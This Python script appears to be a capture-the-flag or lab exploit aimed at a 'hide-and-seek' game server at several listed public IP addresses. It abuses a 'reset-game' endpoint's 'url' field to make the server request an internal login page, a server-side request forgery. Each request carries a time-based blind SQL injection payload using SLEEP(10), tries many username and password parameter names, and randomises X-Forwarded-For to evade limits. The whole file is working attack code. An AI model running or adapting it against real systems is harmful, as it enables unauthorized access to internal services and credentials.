import os, requests, time
from itertools import product

pathes = [
    'http://15.165.37.31:3000/api/reset-game',
    'http://3.38.141.72:3000/api/reset-game',
    'http://43.203.168.235:3000/api/reset-game',
]

headers = {
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Length': '49',
    'Content-Type': 'text/plain;charset=UTF-8',
    'Origin': 'http://15.165.37.31:3000',
    'Pragma': 'no-cache',
    'Referer': 'http://15.165.37.31:3000/hide-and-seek',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
}

q1 = ['name', 'userId', 'userID', 'user_name', 'user_id', 'login_name', 'email', 'login', 'login_name', 'account', 'account_name', 'handle', 'nickname', ]
q2 = ['password', 'pw', 'passwd', 'pwd', 'user_password', 'user_passwd', 'user_pwd', 'user_pw', 'pass', 'passkey', 'hash', 'password_hash', 'credential', 'secret']

for t1, t2 in product(q1, q2):
    headers['X-Forwarded-For'] = os.urandom(16).hex()
    query = f"""{t1}=%22%20and%20SLEEP(10)%3B%23%22&{t2}=nemo"""
    a = time.time()
    response = requests.post(
        'http://43.203.168.235:3000/api/reset-game',
        headers=headers,
        data='{"url":"http://192.168.200.120:808/login?' + query + '"}'
    )
    duration = time.time() - a

    if response.status_code != 200 or duration > 10:
        print('\033[31myeah\033[37m', end=' ')
    print('http://192.168.200.120:808/login?' + query, '=>', response.status_code, response.text)
    time.sleep(0.5)